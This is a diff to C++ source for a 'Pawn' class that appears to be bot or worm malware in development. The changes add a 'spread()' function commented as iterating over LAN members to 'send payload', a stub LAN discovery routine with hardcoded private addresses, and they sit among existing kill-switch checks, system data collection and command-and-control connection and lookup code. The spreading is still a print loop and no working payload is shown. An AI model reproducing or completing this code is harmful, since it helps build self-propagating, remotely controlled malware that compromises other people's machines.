@@ -41,11 +41,15 @@ bool Pawn::checkSWKill() {
 //}
 
 bool Pawn::spread() {
+    // iterate through LAN members & send payload
+    for (auto i = LAN.begin(); i != LAN.end(); ++i){
+        std::cout << "LAN member is" <<  *i << std::endl;
+    }
     return true;
 }
 
 void Pawn::doWork() {
-    for (int i = 0; i < 100; i++) {
+    for (int i = 0; i < 20; i++) {
         std::cout << i << " step" << std::endl;
         std::this_thread::sleep_for(std::chrono::milliseconds(500));
     }
@@ -57,9 +61,10 @@ Pawn::Pawn() {
         if (!checkSWKill()) {
             gen = PRNG();
             sdc = SystemDataCollector();
+            LAN = discoverLAN();
 
             connect2CC();
-            
+
             std::cout << "trying to conSWKill disabled, I'm alive" << std::endl;
 
             // get command from CC
@@ -71,12 +76,24 @@ Pawn::Pawn() {
             sleep(10000);
         }
 
+        // just for right now
+        exit(1);
     }
 
 }
 
 Pawn::~Pawn() { }
 
+std::vector<std::string> Pawn::discoverLAN() {
+    std::vector<std::string> LANs;
+
+    // DEBUG IT
+    LANs.push_back("192.168.210.118");
+    LANs.push_back("192.168.210.111");
+    LANs.push_back("192.168.210.109");
+
+    return LANs;
+}
 
 std::string Pawn::getCC(){
     std::cout << "gen: " << gen.generate() << std::endl;
